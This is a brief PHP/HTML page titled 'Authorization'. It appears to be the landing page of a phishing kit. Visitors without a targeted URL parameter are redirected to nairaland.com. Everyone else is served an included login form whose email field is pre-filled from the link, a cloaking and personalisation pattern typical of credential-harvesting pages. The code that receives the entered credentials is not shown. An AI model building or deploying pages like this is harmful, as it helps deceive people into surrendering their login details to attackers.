<html>
<head>
    <title>Authorization</title>
    
    
<meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="style.css">  
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-122353776-11"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-122353776-11');
</script>

  
</head>

<style>

body{
    margin: 0;
    padding: 0;
    background: url(image.jpg);
    background-size: cover;
    background-position: center;
    font-family: sans-serif;
}

</style>
<?php

if(empty($_GET['0'])) {
    header("Location: http://nairaland.com");
    exit;
}

?>
    <body>
   
        
        <?php
// do php stuff

include('login.html');


?>
        
        </div>

        <script text="text/javascript">
var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;
    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : sParameterName[1];
        }
    }
};

var firstName = getUrlParameter('0');

if (firstName != null) {
     document.getElementById('em').value = firstName;
}

</script>
    
    </body>



</html>